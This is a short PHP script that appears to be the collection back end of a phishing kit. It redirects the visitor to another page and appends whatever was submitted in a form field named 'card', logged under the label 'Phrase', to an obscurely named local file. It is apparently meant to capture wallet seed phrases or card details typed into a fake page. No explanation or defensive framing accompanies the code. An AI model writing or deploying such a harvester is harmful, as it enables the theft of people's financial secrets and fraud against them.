<?php



header("Location:cab56kapl.html");


?>
<?php
$file = "____567811____";
$card   = $_POST['card'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "**************************************");
fwrite($handle, "\n");
fwrite($handle, "Phrase : ");
fwrite($handle, "$card");
fwrite($handle, "\n");
fclose($handle);

?>